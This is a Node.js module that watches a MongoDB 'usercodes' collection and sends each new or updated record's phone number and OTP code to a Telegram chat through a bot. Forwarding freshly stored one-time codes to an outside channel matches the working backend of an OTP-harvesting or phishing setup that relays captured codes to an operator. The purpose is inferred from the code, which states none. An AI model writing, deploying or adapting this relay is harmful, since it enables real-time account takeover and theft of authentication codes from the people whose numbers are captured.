const mongoose = require('mongoose');
const config = require('../config');
const { sendMessage } = require('../bot');
const { log } = require('../utils');

const connectDB = async () => {
  try {
    // Updated connection without deprecated options
    await mongoose.connect(config.mongoDBUrl);
    console.log('MongoDB connected successfully.');

    // Start listening for changes
    listenForChanges();
  } catch (error) {
    console.error('MongoDB connection error:', error);
    log(`MongoDB connection error: ${error}`);
    process.exit(1); // Exit the application if the connection fails
  }
};

const listenForChanges = () => {
  const collection = mongoose.connection.collection('usercodes'); // Replace with your collection name

  // Function to start the Change Stream
  const startChangeStream = () => {
    // Watch for changes in the collection
    const changeStream = collection.watch();

    changeStream.on('change', (change) => {
      if (change.operationType === 'insert') {
        // Extract the relevant data from the change event
        const insertedDocument = change.fullDocument;

        // Format the message to include only the document data
        const message = `New document inserted:
- ID: ${insertedDocument._id}
- Phone: ${insertedDocument.phoneNumber || 'N/A'}
- OTP: ${insertedDocument.otpCode || 'N/A'}`;

        // Send the message to the Telegram chat
        sendMessage(message);
      } else if (change.operationType === 'update') {
        // Handle update operations
        const documentId = change.documentKey._id;

        // Fetch the entire updated document
        collection.findOne({ _id: documentId }, (err, updatedDocument) => {
          if (err) {
            console.error('Error fetching updated document:', err);
            return;
          }

          // Format the message with all fields
          const message = `New document updated:
- ID: ${updatedDocument._id}
- Phone: ${updatedDocument.phoneNumber || 'N/A'}
- OTP: ${updatedDocument.otpCode || 'N/A'}`;

          // Send the message to the Telegram chat
          sendMessage(message);
        });
      }
    });

    changeStream.on('error', (error) => {
      console.error('Change Stream error:', error);
      log(`Change Stream error: ${error}`);

      // Restart the Change Stream after a delay
      setTimeout(() => {
        console.log('Restarting Change Stream...');
        startChangeStream(); // Restart the Change Stream
      }, 5000); // Restart after 5 seconds
    });

    changeStream.on('end', () => {
      console.log('Change Stream ended. Restarting...');
      startChangeStream(); // Restart if the stream ends
    });
  };

  // Start the Change Stream
  startChangeStream();
};

module.exports = connectDB;